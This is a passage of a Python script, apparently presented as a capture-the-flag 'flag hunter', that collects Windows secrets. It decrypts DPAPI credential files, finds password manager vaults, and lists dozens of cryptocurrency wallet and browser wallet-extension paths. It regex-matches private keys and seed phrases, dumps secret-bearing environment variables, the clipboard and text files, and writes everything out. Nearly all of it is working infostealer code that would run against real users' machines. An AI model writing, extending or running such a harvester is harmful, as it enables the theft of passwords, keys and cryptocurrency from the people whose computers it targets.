        r"%LOCALAPPDATA%\Microsoft\Credentials",
        r"%APPDATA%\Microsoft\Credentials",
    ]
    for root in paths:
        r = expand(root)
        if not r.exists(): continue
        for p in iter_files(r, max_size=100*1024):
            raw = read_bytes(p)
            if not raw: continue
            dec = dpapi_decrypt(raw)
            if dec:
                # DPAPI credential blob has a structure — extract printable strings
                for s in strings_from_bytes(dec):
                    if len(s) > 5:
                        emit("DPAPI-Cred", str(p), s)
                        find_seed_phrases(s, str(p))
            else:
                emit("DPAPI-Cred", str(p),
                     f"(cannot decrypt — {len(raw)} bytes — run as owning user)",
                     "Use mimikatz dpapi::cred /in:<file> /masterkey:<key>")

# ── 16. Password managers ─────────────────────────────────────────────────────
def scan_password_managers():
    header("PASSWORD MANAGER DATABASES")

    locations = [
        # KeePass
        (r"%USERPROFILE%", "**/*.kdbx",     "KeePass database (master password required)"),
        (r"%USERPROFILE%", "**/*.kdb",      "KeePass 1.x database"),
        # Bitwarden
        (r"%APPDATA%\Bitwarden", "*.json",  "Bitwarden local vault cache"),
        # 1Password
        (r"%LOCALAPPDATA%\1Password", "**", "1Password local data"),
        # LastPass
        (r"%LOCALAPPDATA%\LastPass", "**",  "LastPass local cache"),
        # Enpass
        (r"%APPDATA%\Enpass", "*.enpassdb", "Enpass database"),
        # KWallet (via WSL)
        (r"%LOCALAPPDATA%\Packages", "*KeePass*", "Windows Store KeePass"),
    ]

    for root, pattern, note in locations:
        r = expand(root)
        if not r.exists(): continue
        for p in r.rglob(pattern.lstrip("**/")):
            if p.is_file():
                emit("PasswordMgr", str(p), f"({p.stat().st_size} bytes)", note)
                # Try to extract any plaintext strings
                raw = read_bytes(p, 8192)
                if raw:
                    for s in strings_from_bytes(raw):
                        if len(s) > 8:
                            emit("PasswordMgr-Str", str(p), s)
                            find_seed_phrases(s, str(p))

# ── 17. Crypto wallets (comprehensive) ────────────────────────────────────────
def scan_crypto_wallets():
    header("CRYPTO WALLETS")

    # (path, wallet_name, notes)
    wallets = [
        # ── Core wallet clients ─────────────────────────────────────────────
        (r"%APPDATA%\Bitcoin\wallet.dat",           "Bitcoin Core",    "wallet.dat — encrypted with passphrase"),
        (r"%APPDATA%\Bitcoin\wallets",              "Bitcoin Core",    "wallet directory"),
        (r"%APPDATA%\Litecoin\wallet.dat",          "Litecoin Core",   ""),
        (r"%APPDATA%\Dogecoin\wallet.dat",          "Dogecoin",        ""),
        (r"%APPDATA%\Dash\wallet.dat",              "Dash",            ""),
        (r"%APPDATA%\Zcash\wallet.dat",             "Zcash",           ""),
        (r"%APPDATA%\Namecoin\wallet.dat",          "Namecoin",        ""),
        (r"%APPDATA%\Peercoin\wallet.dat",          "Peercoin",        ""),
        (r"%APPDATA%\Vertcoin\wallet.dat",          "Vertcoin",        ""),
        (r"%APPDATA%\Ravencoin\wallet.dat",         "Ravencoin",       ""),
        (r"%APPDATA%\Groestlcoin\wallet.dat",       "Groestlcoin",     ""),
        # ── Ethereum / EVM ─────────────────────────────────────────────────
        (r"%APPDATA%\Ethereum\keystore",            "Ethereum Geth",   "UTC JSON keystore files"),
        (r"%USERPROFILE%\.ethereum\keystore",       "Ethereum",        "alternate path"),
        (r"%APPDATA%\Parity\ethereum\keys",         "Parity/OpenEthereum", "JSON keystore"),
        # ── Multi-coin software wallets ────────────────────────────────────
        (r"%APPDATA%\Electrum\wallets",             "Electrum",        "may contain seed in plaintext"),
        (r"%APPDATA%\ElectronCash\wallets",         "Electron Cash (BCH)", ""),
        (r"%APPDATA%\Electrum-LTC\wallets",         "Electrum-LTC",    ""),
        (r"%APPDATA%\Exodus",                       "Exodus",          "check passphrase.json and seed.seco"),
        (r"%APPDATA%\Exodus\exodus.wallet",         "Exodus",          ""),
        (r"%APPDATA%\atomic\Local Storage\leveldb", "Atomic Wallet",   "LevelDB"),
        (r"%APPDATA%\Coinomi\Coinomi\wallets",      "Coinomi",         ""),
        (r"%APPDATA%\Guarda\Local Storage\leveldb", "Guarda",          ""),
        (r"%APPDATA%\Jaxx Liberty\Local Storage",   "Jaxx Liberty",    ""),
        (r"%APPDATA%\Wasabi Wallet\WalletBackups",  "Wasabi Wallet",   ""),
        (r"%APPDATA%\Sparrow\wallets",              "Sparrow Wallet",  ""),
        (r"%USERPROFILE%\AppData\Roaming\Bitcoin Knots\wallet.dat", "Bitcoin Knots", ""),
        # ── Monero ─────────────────────────────────────────────────────────
        (r"%APPDATA%\bitmonero",                    "Monero (monerod)",""),
        (r"%USERPROFILE%\Monero\wallets",           "Monero GUI",      ""),
        (r"%APPDATA%\monero-project\monero-core",   "Monero GUI",      ""),
        # ── Solana ─────────────────────────────────────────────────────────
        (r"%APPDATA%\Phantom",                      "Phantom",         "Solana browser extension wallet"),
        (r"%APPDATA%\SolletWallet",                 "Sollet",          ""),
        # ── Ledger / Trezor (companion apps) ───────────────────────────────
        (r"%APPDATA%\Ledger Live",                  "Ledger Live",     "check accounts.db"),
        (r"%APPDATA%\Trezor Suite",                 "Trezor Suite",    ""),
        # ── Browser extension wallets (LevelDB) ────────────────────────────
        (r"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Local Extension Settings\nkbihfbeogaeaoehlefnkodbefgpgknn",
         "MetaMask (Chrome)",   "Ethereum — vault is AES-GCM encrypted with password"),
        (r"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Local Extension Settings\bfnaelmomeimhlpmgjnjophhpkkoljpa",
         "Phantom-Chrome",      "Solana"),
        (r"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Local Extension Settings\hnfanknocfeofbddgcijnmhnfnkdnaad",
         "Coinbase Wallet-Chrome",""),
        (r"%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Local Extension Settings\nkbihfbeogaeaoehlefnkodbefgpgknn",
         "MetaMask (Edge)",     ""),
        (r"%APPDATA%\Mozilla\Firefox\Profiles",     "MetaMask-Firefox", "find metamask LevelDB in profile"),
        # ── MyCrypto / MEW local ───────────────────────────────────────────
        (r"%APPDATA%\MyCrypto",                     "MyCrypto",        ""),
        (r"%APPDATA%\MyEtherWallet",                "MyEtherWallet",   ""),
        # ── Trust Wallet (Android backup / Windows version) ────────────────
        (r"%APPDATA%\Trust Wallet",                 "Trust Wallet",    ""),
        (r"%LOCALAPPDATA%\Programs\trust-wallet",   "Trust Wallet",    ""),
        # ── imToken / TokenPocket ──────────────────────────────────────────
        (r"%APPDATA%\imToken",                      "imToken",         ""),
        (r"%APPDATA%\TokenPocket",                  "TokenPocket",     ""),
    ]

    for path, name, note in wallets:
        p = expand(path)
        if p.is_file():
            size = p.stat().st_size
            emit(f"Wallet-{name}", str(p), f"({size:,} bytes)", note)
            # String-scan wallet files for seeds / keys
            raw = read_bytes(p, 65536)
            if raw:
                text = raw.decode("latin-1", errors="replace")
                find_seed_phrases(text, str(p))
                for s in strings_from_bytes(raw):
                    # Look for private key material: WIF keys, hex keys, xprv keys
                    if re.match(r'^[5KLc][1-9A-HJ-NP-Za-km-z]{50,51}$', s):  # WIF private key
                        emit(f"Wallet-WIFKey", str(p), s, f"{name} WIF private key")
                    elif re.match(r'^xprv[1-9A-HJ-NP-Za-km-z]{107}$', s):    # xprv (BIP32)
                        emit(f"Wallet-xprv", str(p), s, f"{name} BIP32 extended private key")
                    elif re.match(r'^[0-9a-fA-F]{64}$', s):                   # raw 256-bit hex key
                        emit(f"Wallet-HexKey", str(p), s, f"{name} possible raw private key")

        elif p.is_dir():
            for child in iter_files(p, max_size=10*1024*1024):
                size = child.stat().st_size
                emit(f"Wallet-{name}", str(child), f"({size:,} bytes)", note)
                raw = read_bytes(child, 65536)
                if raw:
                    text = raw.decode("latin-1", errors="replace")
                    find_seed_phrases(text, str(child))
                    for s in strings_from_bytes(raw):
                        if re.match(r'^[5KLc][1-9A-HJ-NP-Za-km-z]{50,51}$', s):
                            emit(f"Wallet-WIFKey", str(child), s, f"{name} WIF private key")
                        elif re.match(r'^xprv[1-9A-HJ-NP-Za-km-z]{107}$', s):
                            emit(f"Wallet-xprv", str(child), s, f"{name} BIP32 xprv")
                        elif re.match(r'^[0-9a-fA-F]{64}$', s):
                            emit(f"Wallet-HexKey", str(child), s, f"{name} raw hex key")

    # Also scan common user locations for wallet.dat or keystore files broadly
    for search_root in [expand(r"%USERPROFILE%"), Path("C:\\")]:
        if not search_root.exists(): continue
        try:
            for p in search_root.rglob("wallet.dat"):
                emit("Wallet-Generic", str(p), f"({p.stat().st_size:,} bytes)", "wallet.dat found")
            for p in search_root.rglob("UTC--*"):           # Ethereum keystore naming
                emit("Wallet-ETHKeystore", str(p), p.read_text()[:500] if p.stat().st_size < 1024 else f"({p.stat().st_size} bytes)")
        except: pass

# ── 18. Environment variables ─────────────────────────────────────────────────
def scan_env():
    header("ENVIRONMENT VARIABLES")
    for name, value in os.environ.items():
        if re.search(r'(?i)(pass|secret|key|token|flag|cred|api|auth|pw)', name+value):
            emit("EnvVar", f"Env:{name}", value)
            find_seed_phrases(value, f"EnvVar:{name}")

# ── 19. Alternate Data Streams ────────────────────────────────────────────────
def scan_ads():
    header("ALTERNATE DATA STREAMS")
    import subprocess
    roots = [r"%USERPROFILE%", r"C:\CTF", r"C:\Flags", r"%TEMP%"]
    for root in roots:
        r = expand(root)
        if not r.exists(): continue
        try:
            out = subprocess.run(
                ["powershell","-NoProfile","-Command",
                 f"Get-Item '{r}' -Stream * -Recurse -ErrorAction SilentlyContinue | "
                 "Where-Object {{$_.Stream -ne ':$DATA' -and $_.Stream -ne 'Zone.Identifier'}} | "
                 "Select-Object FileName, Stream, Length"],
                capture_output=True, text=True, timeout=30).stdout
            for line in out.splitlines():
                if line.strip() and "Stream" not in line and "----" not in line:
                    emit("ADS", str(r), line.strip(),
                         "Alternate Data Stream — get with Get-Content -Stream <name>")
        except: pass

# ── 20. Clipboard ─────────────────────────────────────────────────────────────
def scan_clipboard():
    header("CLIPBOARD CONTENTS")
    import subprocess
    try:
        out = subprocess.run(
            ["powershell","-NoProfile","-Command","Get-Clipboard"],
            capture_output=True, text=True, timeout=5).stdout.strip()
        if out:
            emit("Clipboard", "System clipboard", out[:2000])
            find_seed_phrases(out, "Clipboard")
    except: pass

# ── 21. Text file broad scan (Desktop, Documents, Temp, CTF dirs) ─────────────
def scan_text_files(extra_roots=None):
    header("BROAD TEXT FILE SCAN")

    roots = [
        r"%USERPROFILE%\Desktop", r"%USERPROFILE%\Documents",
        r"%USERPROFILE%\Downloads", r"%TEMP%",
        r"C:\CTF", r"C:\Flags", r"C:\challenge", r"C:\Windows\Temp",
        r"C:\Windows\System32\drivers\etc",
    ]
    if extra_roots: roots += extra_roots

    exts = {".txt",".log",".json",".xml",".ini",".cfg",".conf",".config",
            ".env",".yaml",".yml",".toml",".md",".ps1",".bat",".cmd",
            ".vbs",".py",".php",".html",".js",".cs",".java",".rb",""}

    for root in roots:
        r = expand(root)
        if not r.exists(): continue
        for p in iter_files(r, exts):
            content = read_text(p)
            if not content: continue
            # Print every non-empty, non-boilerplate file
            stripped = content.strip()
            if len(stripped) > 3:
                emit("TextFile", str(p), stripped[:500],
                     f"({p.stat().st_size} bytes)")
                find_seed_phrases(stripped, str(p))

# ── 22. String scan on interesting binary locations ────────────────────────────
def scan_binary_strings():
    header("BINARY STRING SCAN (DPAPI/Vault/Hive files)")
    paths = [
        r"%APPDATA%\Microsoft\Credentials",
        r"%LOCALAPPDATA%\Microsoft\Credentials",
        r"%APPDATA%\Microsoft\Vault",
        r"C:\Windows\Panther",
    ]
    for root in paths:
        r = expand(root)
        if not r.exists(): continue
        for p in iter_files(r, max_size=10*1024*1024):
            raw = read_bytes(p, 65536)
            if not raw: continue
            for s in strings_from_bytes(raw):
                if len(s) > 10:
                    emit("BinaryStr", str(p), s)
                    find_seed_phrases(s, str(p))

# ── Entry point ────────────────────────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(description="CTF Flag Hunter — dumps all credentials")
    parser.add_argument("--out",   help="Save output to file")
    parser.add_argument("--root",  action="append", help="Extra directory to scan")
    parser.add_argument("--deep",  action="store_true", help="String-scan binary blobs")
    args = parser.parse_args()

    print(f"\n{SEP2}\n  CTF FLAG HUNTER\n  {datetime.now():%Y-%m-%d %H:%M:%S}\n{SEP2}")

    scan_text_files(args.root)
    scan_credential_manager()
    scan_vault()
    scan_registry()
    scan_chromium_browsers()
    scan_firefox()
    scan_gpp()
    scan_unattend()
    scan_ssh()
    scan_dev_creds()
    scan_ps_history()
    scan_web_configs()
    scan_sticky_notes()
    scan_ftp_clients()
    scan_wifi()
    scan_dpapi_blobs()
    scan_password_managers()
    scan_crypto_wallets()
    scan_env()
    scan_ads()
    scan_clipboard()
    if args.deep:
        scan_binary_strings()

    # Summary
    print(f"\n{SEP2}\n  COMPLETE — {len(FINDS)} items found\n{SEP2}")

    if args.out:
        Path(args.out).write_text("\n".join(FINDS), encoding="utf-8")
        print(f"[+] Saved: {args.out}")

if __name__ == "__main__":
    main()
